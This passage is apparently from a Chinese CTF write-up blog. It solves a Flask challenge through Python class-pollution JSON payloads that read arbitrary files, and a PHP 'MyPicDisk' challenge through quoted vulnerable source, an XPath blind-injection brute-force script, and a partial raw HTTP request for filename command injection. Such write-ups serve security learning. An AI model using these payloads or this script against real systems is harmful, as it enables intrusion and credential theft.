class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726100732339.png" alt="image-20230726100732339"></p><p>重点是这里  访问根目录的时候会读取我们的内置方法  <strong>(<code>__file__</code>)</strong></p><p>这里的话我们就可以通过污染这个<strong>内置属性</strong> 来指定我们想要读取的文件</p><p><img src="../images/image-20230726101131131.png" alt="image-20230726101131131"></p><p>就是在/<code>register</code>这个路由下  传入我们恶意构造的<code>json</code>语句</p><p>(<strong>这里有疑问的也可以去看看文章开头给的那篇文章)</strong></p><p>但是直接用文章给的<code>payload</code>是打不了的   因为有fuzz  但是因为这个<code>python</code>的<code>paylaod</code>和<code>ssti</code>差不多   所以可以使用编码来进行绕过</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span>:<span class="string">&quot;/proc/self/cgroup&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726101709961.png" alt="image-20230726101709961"></p><p>然后访问根目录  </p><p><img src="../images/image-20230726101758153.png" alt="image-20230726101758153"></p><p>这是个非预期解  </p><p><strong>其实看了文章开头给的文章的话  还可以污染另一个内置方法来直接读取文件</strong></p><p><img src="../images/image-20230726102006243.png" alt="image-20230726102006243"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init\u005f_&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过污染<code>_static_folder</code> 这个属性   <strong>来将当前目录设为根目录</strong></p><p>然后就可以直接进行目录穿越了</p><p><img src="../images/image-20230726102943214.png" alt="image-20230726102943214"></p><p>然后直接开始访问</p><p><img src="../images/image-20230726103038744.png" alt="image-20230726103038744"></p><p>都是可以直接访问的</p><p><img src="../images/image-20230726103154504.png" alt="image-20230726103154504"></p><p>这次比赛好几道题都可以这样来解  就是通过读取这个路径  来看docker的启动的sh文件内容  从而查到flag位置</p><p>就是存在两种可以污染的内置属性(<strong>可能还有其他的  但是我还不知道</strong>)</p><p>因为<code>console</code>开了  预期解是因为污染<code>__file__</code>   然后通过读取文件来算pin 然后再到控制台了读取文件</p><p><strong>(这里就不跟了)</strong></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p><img src="../images/image-20230726104245789.png" alt="image-20230726104245789"></p><p>万能密码登录  然后看到隐藏文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>这里还是有两种解法</strong></p><ul><li>phar文件上传</li><li>system命令拼接</li></ul><p>审计了一下代码  </p><p><strong>得出解题思路</strong></p><p>就是先进行登录   然后传文件</p><p><img src="../images/image-20230726111533509.png" alt="image-20230726111533509"></p><p>主要是得进到这个里面  然后就会实例化<code>FILE</code>这个类</p><p><img src="../images/image-20230726111628995.png" alt="image-20230726111628995"></p><p>这里的时候就会触发phar反序列化了</p><p><strong>另一个拼接命令的方法如下</strong></p><p><img src="../images/image-20230726111717191.png" alt="image-20230726111717191"></p><p>就是通过恶意构造文件名  来通过最后的命令执行</p><p>通过审计代码发现  其实登不登陆成功对做题影响都不大(<strong>不爆破出密码的话可以强制文件上传  都一样的</strong>)</p><p><img src="../images/image-20230726111926604.png" alt="image-20230726111926604"></p><p><img src="../images/image-20230726112001895.png" alt="image-20230726112001895"></p><p>这两个判断登录成功与否的方法并不会直接把代码给阻断掉  <code>echo</code>完后还会继续执行后面的代码</p><p>这里其实有个<strong>xml盲注</strong>的考点可以学习学习</p><p><img src="../images/image-20230726114448432.png" alt="image-20230726114448432"></p><p>这里可以使用<strong>xml盲注</strong>来注出密码的 (<strong>xpath注入</strong>)   ——&gt;  <strong>目的不只是为了做题</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        <span class="comment"># payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;</span></span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        <span class="comment"># payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        <span class="comment"># payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        <span class="comment"># payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        <span class="comment"># payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload_username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload_username)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment">#003d7628772d6b57fec5f30ccbc82be1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登录失败&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>然后就可以把密码给爆破出来了</p><h3 id="system命令拼接"><a href="#system命令拼接" class="headerlink" title="system命令拼接"></a>system命令拼接</h3><p><img src="../images/image-20230726145115503.png" alt="image-20230726145115503"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 210</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://a9d211a4-8dbb-4641-a4e2-b2b64e604908.node4.buuoj.cn:81/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=4ca196683169f8034a864930f1f86e84</span><br><span class="line">Connection: close</span><br><span 